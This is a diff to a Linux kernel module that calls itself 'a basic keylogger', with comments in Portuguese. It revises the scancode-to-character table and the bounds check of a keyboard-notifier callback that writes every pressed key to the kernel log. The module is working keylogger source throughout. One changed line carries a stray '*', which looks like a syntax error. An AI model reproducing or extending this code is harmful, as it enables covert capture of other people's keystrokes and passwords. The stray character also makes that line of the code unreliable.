@@ -15,7 +15,7 @@ MODULE_DESCRIPTION("Um keylogger básico.");
 // mapeando as teclas do teclado de acordo com scancode
 static const char *teclado[][2] = {
 	{"\0", "\0"}, 						//0
-	{"_ESC_", "_ESC_"}, 
+	{"_ESC_", "_ESC_"}, *
 	{"1", "!"}, 
 	{"2", "@"},       
 	{"3", "#"}, 
@@ -43,7 +43,7 @@ static const char *teclado[][2] = {
 	{"´", "`"}, 
 	{"[", "{"},                  
 	{"\n", "\n"}, 
-	{"_LCTRL_", "_LCTRL_"}, 
+	{"_CTRL_E", "_CTRL_E"}, 
 	{"a", "A"}, 						//30
 	{"s", "S"},   
 	{"d", "D"}, 
@@ -56,7 +56,7 @@ static const char *teclado[][2] = {
 	{"ç", "Ç"},                 
 	{"~", "^"}, 						//40
 	{"'", "\""}, 
-	{"_LSHIFT_", "_LSHIFT_"}, 
+	{"_SHIFT_E", "_SHIFT_E"}, 
 	{"]", "}"}, 
 	{"z", "Z"}, 
 	{"x", "X"}, 
@@ -68,9 +68,9 @@ static const char *teclado[][2] = {
 	{",", "<"},                 
 	{".", ">"}, 
 	{";", ":"}, 
-	{"_RSHIFT_", "_RSHIFT_"}, 
+	{"_SHIFT_D", "_SHIFT_D"}, 
 	{"_KPD*_", "_KPD*_"},
-	{"_LALT_", "_LALT_"}, 
+	{"_ALT_E", "_ALT_E"}, 
 	{" ", " "}, 
 	{"_CAPS_", "_CAPS_"}, 
 	{"F1", "F1"},
@@ -83,7 +83,7 @@ static const char *teclado[][2] = {
 	{"F8", "F8"}, 
 	{"F9", "F9"},         
 	{"F10", "F10"}, 
-	{"_NUM_", "_NUM_"}, 
+	{"_NUMLOCK_", "_NUMLOCK_"}, 
 	{"_SCROLL_", "_SCROLL_"},   		//70
 	{"_KPD7_", "_HOME_"}, 
 	{"_KPD8_", "_UP_"}, 
@@ -96,25 +96,25 @@ static const char *teclado[][2] = {
 	{"_KPD1_", "_END_"},         
 	{"_KPD2_", "_DOWN_"}, 				//80
 	{"_KPD3_", "_PGDN"}, 
-	{"_KPD0_", "_INS_"}, 
-	{"_KPD._", "_DEL_"}, 
+	{"_KPD0_", "_INSERT_"}, 
+	{"_KPD._", "_DELETE_"}, 
 	{"_PRTSCR_", "_PRTSCR_"}, 
 	{"\0", "\0"},      
 	{"\\", "|"}, 
 	{"F11", "F11"}, 
 	{"F12", "F12"}, 
-	{"\0", "\0"},     
+	{"/", "?"},     
 	{"\0", "\0"}, 						//90
 	{"\0", "\0"}, 
 	{"\0", "\0"}, 
 	{"\0", "\0"}, 
 	{"\0", "\0"},
 	{"\0", "\0"}, 
-	{"_KPENTER_", "_KPENTER_"}, 
-	{"_RCTRL_", "_RCTRL_"}, 
+	{"_KPDENTER_", "_KPDENTER_"}, 
+	{"_CTRL_D", "_CTRL_D"}, 
 	{"/", "/"},
 	{"_PRTSCR_", "_PRTSCR_"}, 
-	{"_RALT_", "_RALT_"}, 				//100
+	{"_ALTGR_", "_ALTGR_"}, 				//100
 	{"\0", "\0"},   
 	{"_HOME_", "_HOME_"}, 
 	{"_UP_", "_UP_"}, 
@@ -129,24 +129,17 @@ static const char *teclado[][2] = {
 	{"\0", "\0"}, 
 	{"\0", "\0"}, 
 	{"\0", "\0"},   
-	{"/", "?"}, 
+	{"\0", "\0"}, 
 	{"\0", "\0"}, 
 	{"\0", "\0"}, 
 	{"\0", "\0"},         
-	{"_PAUSE_", "_PAUSE_"},           	         
-	{"\0", "\0"},						//120
-	{"\0", "\0"},
-	{"\0", "\0"},
-	{"\0", "\0"},
-	{"\0", "\0"},
-	{"\0", "\0"},
-	{".", "."}              
+	{"_PAUSE_", "_PAUSE_"},           	//119             
 };
 
 // converter o código da tecla para uma string
 void converte_code(int keycode, int shift_mask)
 {
-	if (keycode > KEY_RESERVED && keycode <= final_key) { // se está no intervalo de teclas permitidas
+	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) { // se está no intervalo de teclas permitidas
 		const char *tecla = teclado[keycode][shift_mask]; //pegando a tecla na posição da matriz, se está com shift ativado ou não
 		printk(KERN_INFO "%s\n", tecla); //escrevendo a tecla digitada
 	}
@@ -155,17 +148,17 @@ void converte_code(int keycode, int shift_mask)
 // função para chamar o tradutor de tecla
 int callback(struct notifier_block *bloco, unsigned long code, void *_parametro)
 {
-	struct keyboard_notifier_param *param = _parametro;
+	struct keyboard_notifier_param *param = _parametro; //estrutura para detectar eventos do teclado
 
 	// executar somente quando uma tecla for pressionada e o código vier como inteiro
 	if (param->down && code == KBD_KEYCODE){
-		converte_code(param->value, param->shift);
+		converte_code(param->value, param->shift); //passando o keycode e se o sifht esta pressionado
 	}
 	
-	return NOTIFY_OK;
+	return NOTIFY_OK; //Notificação bem sucedida
 }
 
-//definindo função a ser chamada quando houver uma notificação
+//definindo função a ser chamada quando houver uma notificação de um evento
 static struct notifier_block notificador =
 {
     .notifier_call = callback
